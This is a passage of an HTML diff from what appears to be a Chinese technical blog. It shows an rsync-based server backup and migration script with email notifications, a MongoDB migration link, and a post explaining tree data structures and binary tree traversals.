class="line">rsync -avz --delete --progress -e ssh <span class="variable">$SOURCE_USER</span>@<span class="variable">$SOURCE_HOST</span>:<span class="variable">$SOURCE_DIR</span> <span class="variable">$BACKUP_DIR</span> 2&gt;&amp;1 | <span class="built_in">tee</span> -a <span class="variable">$LOG_FILE</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查备份成功</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;备份成功，保存在 <span class="variable">$BACKUP_DIR</span>&quot;</span> &gt;&gt; <span class="variable">$LOG_FILE</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;备份失败！请检查日志 <span class="variable">$LOG_FILE</span> 以获取详细信息&quot;</span> | mail -s <span class="string">&quot;Backup Failed&quot;</span> <span class="variable">$EMAIL_RECIPIENT</span></span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行迁移</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;开始迁移...&quot;</span> &gt;&gt; <span class="variable">$LOG_FILE</span></span><br><span class="line">rsync -avz --delete --progress -e ssh <span class="variable">$SOURCE_USER</span>@<span class="variable">$SOURCE_HOST</span>:<span class="variable">$SOURCE_DIR</span> <span class="variable">$TARGET_USER</span>@<span class="variable">$TARGET_HOST</span>:<span class="variable">$TARGET_DIR</span> 2&gt;&amp;1 | <span class="built_in">tee</span> -a <span class="variable">$LOG_FILE</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查迁移成功</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;迁移成功！从 <span class="variable">$SOURCE_HOST</span> 到 <span class="variable">$TARGET_HOST</span>&quot;</span> &gt;&gt; <span class="variable">$LOG_FILE</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;备份和迁移成功！日志详情见 <span class="variable">$LOG_FILE</span>&quot;</span> | mail -s <span class="string">&quot;Server Migration Success&quot;</span> <span class="variable">$EMAIL_RECIPIENT</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;迁移失败！请检查日志 <span class="variable">$LOG_FILE</span> 以获取详细信息&quot;</span> | mail -s <span class="string">&quot;Migration Failed&quot;</span> <span class="variable">$EMAIL_RECIPIENT</span></span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出完成信息</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;备份和迁移完成：从 <span class="variable">$SOURCE_HOST</span> 到 <span class="variable">$TARGET_HOST</span> 和 <span class="variable">$BACKUP_DIR</span>&quot;</span></span><br></pre></td></tr></table></figure>
+<h2 id="mongo-数据迁移"><a href="#mongo-数据迁移" class="headerlink" title="mongo 数据迁移"></a>mongo 数据迁移</h2><p><a target="_blank" rel="noopener" href="https://www.mongodb.com/zh-cn/docs/ops-manager/current/tutorial/migrate-member-to-new-hardware/">将副本集成员迁移到新服务器</a></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2026/09/19/tree/">
+                树 ADT
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2026-09-19</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/AI/">AI</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <pre class="mermaid">graph LR
+    A[树] --> B[二叉树]
+    B[二叉树] --> C[完全二叉树]
+    C[完全二叉树] --> D[满二叉树]
+    C[完全二叉树] --> E[堆]
+    E[堆] --> F[大顶堆]
+    E[堆] --> G[小顶堆]
+    B[二叉树] --> H[二叉查找树]
+    B[二叉树] --> I[平衡二叉树]
+    B[二叉树] --> J[平衡二叉查找树]
+    J[平衡二叉查找树] --> K[红黑树]
+    J[平衡二叉查找树] --> L[AVL]
+    A[树] --> M[N叉树]
+    M[N叉树] --> N[B树]
+    M[N叉树] --> O[B+树]</pre>
+
+<p><img src="/images/tree.png"></p>
+<h1 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h1><p>每一个节点最多两个子节点</p>
+<p><img src="/images/tree-ercha.png"></p>
+<p>前序遍历<br>遍历顺序是根节点-&gt;左子树-&gt;右子树<br>遍历的得到的序列是：<code>1 2 4 5 3 6 7</code></p>
+<p>中序遍历<br>遍历顺序是左子树-&gt;根节点-&gt;右子树<br>遍历的得到的序列是：<code>4 2 5 1 6 3 7</code></p>
+<p>后序遍历<br>遍历顺序是左子树-&gt;右子树-&gt;根节点<br>遍历的得到的序列是：<code>4 5 2 6 7 3 1</code></p>
+<p>满二叉树</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义：</span></span><br><span class="line">1.叶子节点都在最底层</span><br><span class="line">2.除了叶子节点，每个节点都有左、由两个子节点</span><br></pre></td></tr></table></figure>
+
+<p>完全二叉树</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义：</span></span><br><span class="line">1.叶子节点都在最底下两层</span><br><span class="line">2.最后一层的子节点，都靠左排列</span><br><span class="line">3.除了最后一层，其它层的节点个数，都要达到最大</span><br></pre></td></tr></table></figure>
+
+<p>二叉查找树</p>
+<p><img src="/images/tree-erchachaozhao.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义：</span></span><br><span class="line">1.树中的每一个节点的值</span><br><span class="line">2.都要大于左子树中每个节点的值</span><br><span class="line">3.都要小于右子树中每个节点的值</span><br></pre></td></tr></table></figure>
+
+<p>AVL树</p>
+<p><img src="/images/tree-erchachazhao-to-avl.png"></p>
+<p>红黑树</p>
+<p><img src="/images/tree-honghei.png"></p>
+<p>B树</p>
+<p>B+树</p>
+
         </div>
     
 
@@ -1379,19 +1452,19 @@
         <ul>
             
             <li>
-                <a class="footer-post" href="/2026/09/19/2026-09-19-expanded-blog-ollama/">[expanded] [blog] Ollama</a>
-            </li>
-            
-            <li>
                 <a class="footer-post" href="/2026/09/19/2026-09-19-expanded-blog-linux%E5%91%BD%E4%BB%A4/">[expanded] [blog] Linux命令</a>
             </li>
             
             <li>
-                <a class="footer-post" href="/2026/09/19/pantesting-interview/">渗透 面试题</a>
+                <a class="footer-post" href="/2026/09/19/2026-09-19-expanded-blog-ollama/">[expanded] [blog] Ollama</a>
             </li>
             
             <li>
-                <a class="footer-post" href="/2026/09/19/pantesting-note/">渗透笔记</a>
+                <a class="footer-post" href="/2026/09/19/xss/">XSS跨站脚本攻击</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2026/09/19/software-structure/">软件架构演变</a>
             </li>
             
         </ul>
